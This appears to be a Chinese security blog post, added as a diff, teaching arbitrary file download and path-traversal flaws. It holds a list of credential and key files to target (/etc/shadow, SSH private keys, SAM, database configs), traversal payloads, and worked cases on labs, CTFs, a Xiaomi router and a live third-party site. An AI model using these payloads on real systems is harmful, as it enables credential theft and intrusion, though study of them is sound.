@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="Al0nez" />
+
+
+
+<meta name="description" content="前言">
+<meta property="og:type" content="article">
+<meta property="og:title" content="32WEB漏洞-文件操作之文件下载读取全解">
+<meta property="og:url" content="https://al0nez.github.io/2021/09/21/32WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/index.html">
+<meta property="og:site_name" content="Al0nez&#39;s Bolg">
+<meta property="og:description" content="前言">
+<meta property="og:locale">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119186.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119125.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119040.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119082.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119221.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119120.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119690.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119696.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119954.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119957.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119190.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119339.png">
+<meta property="article:published_time" content="2021-09-21T02:35:42.000Z">
+<meta property="article:modified_time" content="2021-09-21T03:24:04.376Z">
+<meta property="article:author" content="Al0nez">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="小迪学习笔记">
+<meta property="article:tag" content="文件下载">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119186.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Al0nez&#39;s Bolg" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>32WEB漏洞-文件操作之文件下载读取全解 | Al0nez&#39;s Bolg</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Al0nez</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">我与春风皆过客,你携秋水揽星河</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">文章</a></li>
+                        
+                            <li><a href="/tags/">标签</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa 博客园" href="/L0ne1y.github.io" title="博客园"></a>
+                            
+                                <a class="fa QQ" href="#" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于前端</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Al0nez</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Al0nez</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">我与春风皆过客,你携秋水揽星河</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">文章</a></li>
+                
+                    <li><a href="/tags/">标签</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa 博客园" target="_blank" href="/L0ne1y.github.io" title="博客园"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="#" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-32WEB漏洞-文件操作之文件下载读取全解" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/21/32WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/" class="article-date">
+      <time datetime="2021-09-21T02:35:42.000Z" itemprop="datePublished">2021-09-21</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      32WEB漏洞-文件操作之文件下载读取全解
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">小迪学习笔记</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" rel="tag">文件下载</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><span id="more"></span>
+
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119186.png" alt="image-20210917093013895"></p>
+<h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>一些提供了文件查看或者下载功能的web应用在对用户查看或下载的文件没有限制的情况下，导致恶意用户能够查看或下载任意敏感文件</p>
+<h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><p><strong>白盒</strong></p>
+<ul>
+<li>代码审计</li>
+</ul>
+<p><strong>黑盒</strong></p>
+<ul>
+<li>公开漏洞</li>
+<li>漏扫工具</li>
+<li>手工看参数值及功能</li>
+</ul>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p> <strong>常见文件</strong></p>
+<p>后台日志等可见的文件</p>
+<p><strong>敏感文件</strong></p>
+<ul>
+<li>数据库配置文件</li>
+<li>各种接口文件</li>
+<li>密钥信息等文件</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Windows:</span><br><span class="line">C:\boot.ini //查看系统版本</span><br><span class="line">C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件</span><br><span class="line">C:\Windows\repair\sam //存储系统初次安装的密码</span><br><span class="line">C:\Program Files\mysql\my.ini //Mysql配置</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD //Mysql root</span><br><span class="line">C:\Windows\php.ini //php配置信息</span><br><span class="line">C:\Windows\my.ini //Mysql配置信息</span><br><span class="line"></span><br><span class="line">Linux</span><br><span class="line">/root/.ssh/authorized_keys //如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去</span><br><span class="line">/root/.ssh/id_rsa //ssh私钥,ssh公钥是id_rsa.pub</span><br><span class="line">/root/.ssh/id_ras.keystore //记录每个访问计算机用户的公钥</span><br><span class="line">/root/.ssh/known_hosts</span><br><span class="line">//ssh会把每个访问过计算机的公钥(public key)都记录在~/.ssh/known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。</span><br><span class="line">/etc/passwd // 账户信息</span><br><span class="line">/etc/shadow // 账户密码文件</span><br><span class="line">/etc/my.cnf //mysql 配置文件</span><br><span class="line">/etc/httpd/conf/httpd.conf // Apache配置文件</span><br><span class="line">/root/.bash_history //用户历史命令记录文件</span><br><span class="line">/root/.mysql_history //mysql历史命令记录文件</span><br><span class="line">/proc/self/fd/fd[0-9]*(文件标识符)</span><br><span class="line">/proc/mounts //记录系统挂载设备</span><br><span class="line">/porc/config.gz //内核配置文件</span><br><span class="line">/var/lib/mlocate/mlocate.db //全文件路径</span><br><span class="line">/porc/self/cmdline //当前进程的cmdline参数</span><br><span class="line"></span><br><span class="line">java+apache站点:</span><br><span class="line">/conf/tomcat-users.xml</span><br><span class="line">/WEB-INF/classes/applicationContext.xml</span><br><span class="line">/WEB-INF/web.xml</span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">/etc/apache2/httpd.conf</span><br><span class="line">/etc/apache2/apache2.conf</span><br><span class="line"></span><br><span class="line">nginx服务器:</span><br><span class="line">/etc/nginx/nginx.conf</span><br><span class="line">/usr/local/nginx/conf/nginx.conf</span><br><span class="line">/usr/local/etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure>
+
+<h4 id="下载参数"><a href="#下载参数" class="headerlink" title="下载参数"></a>下载参数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">read.xxx?filename=</span><br><span class="line">down.xxx?filename=</span><br><span class="line">readfile.xxx?file=</span><br><span class="line">downfile.xxx?file=</span><br><span class="line">../ ..\ .\ ./等</span><br><span class="line">%00 ? %23 %20 .等</span><br><span class="line">&amp;readpath=、&amp;filepath=、&amp;path=、&amp;inputfile=、&amp;url=、&amp;data=、&amp;readfile=、&amp;menu=、META-INF= 、</span><br><span class="line">WEB-INF</span><br></pre></td></tr></table></figure>
+
+<h4 id="各种协议调用配合"><a href="#各种协议调用配合" class="headerlink" title="各种协议调用配合"></a>各种协议调用配合</h4><p><strong>Javaweb 文件下载代码</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">String path = request.getContextPath();</span><br><span class="line">String basePath =</span><br><span class="line">request.getScheme()+&quot;://&quot;+request.getServerName()+&quot;:&quot;+request.getServerPort()+path+&quot;/&quot;;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;a href=&quot;/download/DownloadServlet?filename=1.jpg&quot;&gt;文件下载&lt;/a&gt;</span><br><span class="line">public void doGet(HttpServletRequest request, HttpServletResponse response)</span><br><span class="line">throws ServletException, IOException &#123;</span><br><span class="line">response.setCharacterEncoding(&quot;UTF-8&quot;);</span><br><span class="line">//设置 ContentType 字段值</span><br><span class="line">response.setContentType(&quot;text/html;charset=utf-8&quot;);</span><br><span class="line">//获取所要下载的文件名称</span><br><span class="line">String filename = request.getParameter(&quot;filename&quot;);</span><br><span class="line">//下载文件所在目录</span><br><span class="line">String folder = &quot;/filename/&quot;;</span><br><span class="line">//通知浏览器以下载的方式打开</span><br><span class="line">response.addHeader(&quot;Content-type&quot;, &quot;appllication/octet-stream&quot;);</span><br><span class="line">response.addHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename=&quot;+filename);</span><br><span class="line">//通知文件流读取文件</span><br><span class="line">InputStream in = getServletContext().getResourceAsStream(folder+filename);</span><br><span class="line">//获取 response 对象的输出流</span><br><span class="line">OutputStream out = response.getOutputStream();</span><br><span class="line">byte[] buffer = new byte[1024];</span><br><span class="line">int len;</span><br><span class="line">//循环取出流中的数据</span><br><span class="line">while((len = in.read(buffer)) != -1)&#123;</span><br><span class="line">out.write(buffer,0,len);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="涉及案例："><a href="#涉及案例：" class="headerlink" title="涉及案例："></a>涉及案例：</h3><h4 id="Pikachu-文件下载测试-参数"><a href="#Pikachu-文件下载测试-参数" class="headerlink" title="Pikachu-文件下载测试-参数"></a>Pikachu-文件下载测试-参数</h4><p>点击图片会进行下载，下载链接如下，可以很容易看出是文件下载漏洞，只需要修改filename后面的参数就可以下载任意文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png</span><br></pre></td></tr></table></figure>
+
+<p>图片链接地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/unsafedownload/download/kb.png</span><br></pre></td></tr></table></figure>
+
+<p>可以看到他们不在一个目录下，这里我试着下载一下<code>execdownload.php</code>文件，所有需要退一级目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=../execdownload.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119125.png" alt="image-20210917104937450"></p>
+<p>可以看到我们成功下载了这个文件。那么我们是不是可以下载配置文件呢！查看我们刚下载的文件发现有一个配置文件。</p>
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119040.png" alt="image-20210917105047042"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=../../../inc/function.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119082.png" alt="image-20210917105316786"></p>
+<p>成功下载到该文件</p>
+<h4 id="Zdns-文件下载真实测试-功能点"><a href="#Zdns-文件下载真实测试-功能点" class="headerlink" title="Zdns-文件下载真实测试-功能点"></a>Zdns-文件下载真实测试-功能点</h4><p>当我们点击下载后会进行下载</p>
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119221.png" alt="image-20210917105737348"></p>
+<p>复制下载链接发现问题，这里用了base64加密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://down.znds.com/getdownurl/?s=L2Rvd24vMjAyMTA4MDYveXN0cHpzXzEuMS43X2RhbmdiZWkuYXBr</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119120.png" alt="image-20210917105906515"></p>
+<p>可以看到经过解密发现，这里加密的内容和我们下载的名字一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">L2Rvd24vMjAyMTA4MDYveXN0cHpzXzEuMS43X2RhbmdiZWkuYXBr</span><br><span class="line"></span><br><span class="line">解密:</span><br><span class="line"></span><br><span class="line">/down/20210806/ystpzs_1.1.7_dangbei.apk</span><br></pre></td></tr></table></figure>
+
+<p>我们下载一下他的html文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://down.znds.com/getdownurl/?s=../apk/app/2019/0909/7206.html</span><br><span class="line">加密后</span><br><span class="line">http://down.znds.com/getdownurl/?s=Li4vYXBrL2FwcC8yMDE5LzA5MDkvNzIwNi5odG1s</span><br></pre></td></tr></table></figure>
+
+<p>链接被重置了。。但是漏洞应该存在</p>
+<h4 id="小米路由器-文件读取真实测试-漏洞"><a href="#小米路由器-文件读取真实测试-漏洞" class="headerlink" title="小米路由器-文件读取真实测试-漏洞"></a>小米路由器-文件读取真实测试-漏洞</h4><p>fofa中可以找到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxxx:8888/api-third-party/download/extdisks../etc/shadow</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119690.png" alt="image-20210917111357871"></p>
+<p>可以看到我们可以成功下载到他的文件</p>
+<h4 id="RoarCTF2019-文件读取真题复现-比赛"><a href="#RoarCTF2019-文件读取真题复现-比赛" class="headerlink" title="RoarCTF2019-文件读取真题复现-比赛"></a>RoarCTF2019-文件读取真题复现-比赛</h4><p>可以看到这个链接存在一个文件下载漏洞，因为是java环境，所有他的配置文件目录是<code>/WEB-INF/web.xml</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4f51f59a-99ce-4c6a-8827-f3a83c98ce38.node4.buuoj.cn:81/Download?filename=help.docx</span><br></pre></td></tr></table></figure>
+
+<p>这里修改下载参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4f51f59a-99ce-4c6a-8827-f3a83c98ce38.node4.buuoj.cn:81/Download?filename=/WEB-INF/web.xml</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119696.png" alt="image-20210917111714361"></p>
+<p>这里有个小知识点返回这个错误，表示java接收的是POST参数，不是GET</p>
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119954.png" alt="image-20210917111818578"></p>
+<p>这里成功下载到配置文件</p>
+<p>然后打开发现了flag的信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;  &lt;-</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/Flag&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure>
+
+<p>熟悉javaweb开发的应该知道，此处指的路径是<code>WEB-INF/classes/com/wm/ctf/FlagController.class</code></p>
+<p>根据该路径成功下载到flag文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3thM2E1ZDFkOC0xY2UwLTQwNDMtYTAzMi1mYzE4ODYzZDVjMzR9Cg==</span><br></pre></td></tr></table></figure>
+
+<p>经过解密成为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a3a5d1d8-1ce0-4043-a032-fc18863d5c34&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="百度杯-2017-二月-Zone-真题复现-比赛拓展"><a href="#百度杯-2017-二月-Zone-真题复现-比赛拓展" class="headerlink" title="百度杯 2017 二月-Zone 真题复现-比赛拓展"></a>百度杯 2017 二月-Zone 真题复现-比赛拓展</h4><p>通过抓包发现Cookie中login=0，我们试着修改为1</p>
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119957.png" alt="image-20210917112702300"></p>
+<p>登录成功后继续抓包</p>
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119190.png" alt="image-20210917135752391"></p>
+<p>这里发现文件下载漏洞，成功读取到passwd文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..././..././..././etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119339.png" alt="image-20210917140011563"></p>
+<h3 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-98122">https://www.seebug.org/vuldb/ssvid-98122</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.ichunqiu.com/battalion?t=1&amp;r=57475">https://www.ichunqiu.com/battalion?t=1&amp;r=57475</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/Cheng_May/article/details/78600833">https://blog.csdn.net/Cheng_May/article/details/78600833</a></li>
+<li><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java">https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java</a></li>
+</ul>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2021/09/21/32WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/">32WEB漏洞-文件操作之文件下载读取全解</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Al0nez</a></p>
+        <p><span>发布时间:</span>2021-09-21, 10:35:42</p>
+        <p><span>最后更新:</span>2021-09-21, 11:24:04</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2021/09/21/32WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/" title="32WEB漏洞-文件操作之文件下载读取全解">https://al0nez.github.io/2021/09/21/32WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://al0nez.github.io/2021/09/21/32WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/　　作者: Al0nez" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2021/09/21/33WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/">
+                    33WEB漏洞-逻辑越权之水平垂直越权全解
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2021/09/21/31WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/">
+                    31WEB漏洞-文件操作之文件包含漏洞全解
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
